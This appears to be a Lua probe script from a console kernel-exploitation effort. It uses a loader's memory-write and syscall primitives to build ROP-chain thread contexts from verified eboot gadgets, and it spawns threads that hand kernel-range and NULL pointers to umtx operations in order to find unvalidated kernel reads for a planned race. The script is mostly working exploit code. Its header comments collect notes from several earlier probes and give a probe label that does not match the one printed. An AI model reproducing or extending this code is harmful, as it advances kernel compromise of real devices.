-- CRASH_CLASS: HIGH (a child thread executes a stack-built ROP chain)
-- PROBE 166a: the pointer arguments of the ops that sleep without touching obj
--
-- 165a showed ops 9 and 12 sleep with obj untouched, so whatever they wait on
-- arrives through the arguments instead. 161a handed them valid pages and they
-- slept; this probe hands them pointers the kernel must not use, one variant per
-- thread, and watches for a return instead of a sleep.
--
-- A handler that dereferences a user pointer without a checked copyin will fault
-- in kernel context. That is the failure mode that panicked thr_create when
-- pcb_onfault was not set, so a return code here is the good outcome and a
-- vanished thread is the answer that says "no validation, it slept first".
--
-- Six threads, sequential, each on its own word: op 9 and op 12 x
-- {RCX = kernel range, RCX = NULL, R8 = kernel range}.
--
-- 161a ran every op code once. Ops 6-17 never returned, which means the handler
-- put the thread to sleep. Nothing yet says which ops are waiters or what they
-- wait on.
--
-- Each candidate op gets one thread blocked on its own word. The main thread
-- then calls op 3 (which 161a showed returns 0 and is the only wake-shaped code
-- available) on that same word with val = 1. If the thread's slot gets written,
-- the op was a waiter on that word and op 3 woke it - which names both ends of
-- the pair. If the slot stays untouched, the op is blocking on something else.
--
-- Three ops, three threads: cheap against the ~20 per-process budget.
--
-- 163a handed op 4/5 a NULL, an unmapped and a kernel-shaped uaddr2 and got 0
-- every time, but the lock was uncontended, so the timeout path never ran: the
-- handler returns as soon as it owns the word and never reads uaddr2.
--
-- To reach that path the word must be owned by someone else. This probe locks a
-- word from the main thread (op 5, owner = main tid), then starts a child that
-- asks for the same word with uaddr2 set to an address the kernel is not allowed
-- to read. The child blocks; the question is whether it parses the timeout
-- through a checked copyin (returns -1/EFAULT, slot written) or not (the thread
-- never comes back, slot untouched).
--
-- A child that faults inside the kernel has to fault with pcb_onfault set, which
-- is the same mechanism whose absence panicked thr_create in 13.60. A plain
-- -1/EFAULT means the copyin is guarded.
--
-- 158b left a contradiction. A thread with RAX = 432 (thr_self) and RDI = buf
-- wrote gettimeofday's seconds into buf, so the call through syscall_address
-- looked like 116 every time. But make_syscall(20) returns a real pid through
-- that same address on the main thread, and thr_create genuinely copies RAX
-- (158a stored 0x1234 from the context).
--
-- This probe asks the same question three ways in one run, with no nanosleep
-- and therefore no way to park the Lua thread:
--
--   A  make_syscall(20)                      -> pid?
--   B  make_syscall(116)                     -> timeval?
--   C  fcall(syscall_address, 432)(buf)      -> TID or timeval?
--   D  fcall(syscall_address, 20)            -> pid?
--   E  a thread with RAX = 432, RDI = buf    -> TID or timeval?
--
-- NOTE: 158a-158c entered at `wrapper`, which is `syscall_address - 7`, i.e. at
-- the `mov rax, 116` itself. That is why every thread call came back as
-- gettimeofday: the number was overwritten by the prologue before the syscall.
-- E here enters at `syscall_address`, past that mov.
--
-- C is the decisive row: it goes through the loader's own fcall, the path that
-- make_syscall uses, with a number the kernel answers visibly (thr_self writes
-- a thread id). If C writes a timeval, the address really is gettimeofday-only.
-- If C writes a TID, the main thread and the child differ and E isolates how.
--
-- 157a proved a thr_create(430) child can run libkernel's syscall wrapper in a
-- loop, but that wrapper has `mov rax, 116` in front of it, so the thread can
-- only ever call gettimeofday. The interesting syscalls (454 umtx, 560 kevent,
-- 97 socket) need their own number in RAX.
--
-- eboot has no `syscall` instruction (157a scanned 1 MB for 0F 05 C3), but
-- libkernel does, inside the same wrapper: `mov rax, 116; mov r10, rcx;
-- syscall; ret`. The `syscall; ret` tail can be entered directly.
--
-- libkernel .text cannot be read to find that tail, so the wrapper is entered
-- at syscall.syscall_address (past the `mov rax, 116`) with RAX supplied by the
-- thread context:
--
--   RIP = syscall_address   (mov r10, rcx; syscall; ret)
--   RAX = 20 (getpid), RDI = marker page, RSP -> [mov [rdi], rax; ret][jmp $]
--
-- A non-zero marker equal to the process pid proves three things at once: the
-- child executes, an arbitrary syscall number reaches the kernel, and the
-- return value comes back to us.
--
-- This is the step that turns 157a's curiosity into the tool the umtx race
-- needs: swap 20 for 454 and the marker page for a umtx word, and the thread is
-- inside a blocking syscall while the main thread acts.

print("=== PROBE 158c: WHICH SYSCALL NUMBER DOES THE THREAD ACTUALLY RUN? ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc_getpid = make_syscall(20)
local sc_thr_self = make_syscall(432)
local sc_thr_create = make_syscall(430)
local sc_thr_kill = make_syscall(433)
local sc_nanosleep = make_syscall(240)
local sc_mmap = make_syscall(477)

local C_MAGIC, C_FLAGS, C_TYPE = 0x108, 0x0D0, 0x110
local C_CS, C_RIP, C_RSP, C_SS = 0x0C0, 0x0E0, 0x0F8, 0x100
local C_RDI, C_RSI, C_RDX, C_RAX = 0x048, 0x050, 0x058, 0x078

---------------------------------------------------------------------------
-- [0] identity, eboot base, and the libkernel wrapper
---------------------------------------------------------------------------
local ok0, pid0 = pcall(function() return sc_getpid():tonumber() end)
print("[0] canary pid=" .. tostring(pid0))

local tid_buf = memory.alloc(8)
zero(tid_buf, 8)
pcall(function() sc_thr_self(uint64(tid_buf)) end)
local main_tid = rq(tid_buf)
print("[0] main TID=" .. q(main_tid))

local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
if not text_lo then
    print("[0] module query returned nothing; aborting")
    return
end
local eboot_base = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
print("[0] eboot text base=" .. q(eboot_base))

local SW = syscall.syscall_address
if SW == nil then
    print("[0] syscall.syscall_address is nil; the loader did not expose the wrapper")
    return
end
local sw_hi, sw_lo = get_hi_lo(SW)
local wrapper = uint64(string.format("0x%X%08X", sw_hi, sw_lo - 7))
print("[0] syscall_address=" .. q(SW) .. " wrapper=" .. q(wrapper))

-- libkernel .text is execute-only: reading even one byte of it kills the
-- process (this probe's first run died at the line below before it could print
-- a byte). So the wrapper is used, not inspected: syscall.syscall_address
-- already points past the `mov rax, 116`, at `mov r10, rcx; syscall; ret`, and
-- RAX comes from the thread context instead of from the wrapper.
local SysretKnown = false

---------------------------------------------------------------------------
-- [1] the two eboot gadgets, verified by byte before use
---------------------------------------------------------------------------
-- Known from 156d on this firmware; verified before use so a different build
-- cannot silently mis-execute.
local store = eboot_base + 0x92C67
local jmp_self = eboot_base + 0x15481
local function check4(a, b0, b1, b2, b3)
    return rb(a) == b0 and rb(a + 1) == b1 and rb(a + 2) == b2 and rb(a + 3) == b3
end
if not check4(store, 0x48, 0x89, 0x07, 0xC3) then
    print("[1] store gadget mismatch at " .. q(store) .. "; aborting")
    return
end
if not (rb(jmp_self) == 0xEB and rb(jmp_self + 1) == 0xFE) then
    print("[1] jmp $ mismatch at " .. q(jmp_self) .. "; aborting")
    return
end
print("[1] store=" .. q(store) .. " jmp $=" .. q(jmp_self))

---------------------------------------------------------------------------
-- [2] pointer variants
---------------------------------------------------------------------------
local umtx = make_syscall(454)

local function page(n)
    local p = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    for off = 0, (n or 0x38), 8 do wq(p + off, uint64(0)) end
    return p
end

local function spawn(rax, rdi, rsi, rdx, rcx, r8, rsp)
    local ctx = sc_mmap(uint64(0), uint64(0x1000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    zero(ctx, 0x500)
    wq(ctx + C_MAGIC, uint64(0x480))
    wd(ctx + C_FLAGS, 0)
    wd(ctx + C_TYPE, 0x10000)
    wd(ctx + C_CS, 0x43)
    wq(ctx + C_RIP, syscall.syscall_address)
    wq(ctx + C_RSP, rsp)
    wd(ctx + C_SS, 0x3B)
    wq(ctx + C_RAX, rax)
    wq(ctx + C_RDI, rdi)
    wq(ctx + C_RSI, rsi)
    wq(ctx + C_RDX, rdx)
    wq(ctx + 0x060, rcx)
    wq(ctx + 0x068, r8)
    local id_buf = memory.alloc(8)
    zero(id_buf, 8)
    local ok = pcall(function() return sc_thr_create(uint64(ctx), uint64(id_buf)) end)
    return rq(id_buf)
end

local function burn(n)
    local x = 0
    for k = 1, (n or 2000000) do x = x + k end
end

local kernel_ptr = uint64(string.format("0x%X%08X", 0xFFFFF000, 0x00000000))
local cases = {
    { label = "RCX=kernel",  rcx = kernel_ptr, r8 = uint64(0) },
    { label = "RCX=NULL",    rcx = uint64(0),  r8 = uint64(0) },
    { label = "R8=kernel",   rcx = uint64(0),  r8 = kernel_ptr },
}

for _, op in ipairs({ 9, 12 }) do
    for i, c in ipairs(cases) do
        print("")
        print(string.format("-- op %d, %s", op, c.label))
        local word = page(0x18)
        local slot = page(0x18)
        wq(slot, uint64(0x1111))
        local stack = page(0x38)
        wq(stack, store)
        wq(stack + 8, jmp_self)
        local tid = spawn(uint64(454), word, uint64(op), uint64(0), c.rcx, c.r8, stack)
        burn(2500000)
        local got = rq(slot)
        local gh, gl = get_hi_lo(got)
        print(string.format("[2] tid=%s slot=%s returned=%s word=%s",
            q(tid), q(got), tostring(gl ~= 0x1111), q(rq(word))))
        if gl ~= 0x1111 then
            pcall(function() sc_thr_kill(tid, uint64(0)) end)
        end
    end
end

print("")
print("[2] canary pid=" .. tostring(sc_getpid():tonumber()))
print("")
print("=== PROBE 166a DONE ===")
